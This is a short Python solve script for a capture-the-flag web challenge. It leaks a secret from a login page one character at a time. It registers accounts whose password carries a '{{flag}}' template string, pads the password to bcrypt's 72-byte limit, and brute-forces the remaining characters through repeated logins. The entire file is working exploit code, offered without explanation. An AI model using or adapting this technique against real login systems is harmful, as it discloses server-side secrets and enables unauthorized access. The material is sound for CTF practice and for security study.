import requests
import os
import string

HOST = "http://creative-login-page.amt.rs"
CHARSET = "}_" + string.ascii_letters + string.digits
FLAG = "amateursCTF{"
# FLAG = "a"

def register(username, password):
    return requests.post(f"{HOST}/register", data={'username': username, 'password': password})

def login(username, password):
    return requests.post(f"{HOST}/login",data={'username': username, 'password': password})

while FLAG[-1] != "}":
    found = False
    uname = os.urandom(16).hex()
    passwd = "A" * (72 - len(FLAG) - 1)
    register(uname, passwd + "{{flag}}")
    for c in CHARSET:
        r = login(uname, passwd + FLAG + c)
        if r.status_code == 200:
            found = True
            FLAG = FLAG + c
            print(FLAG)
            break
    if found == False: break


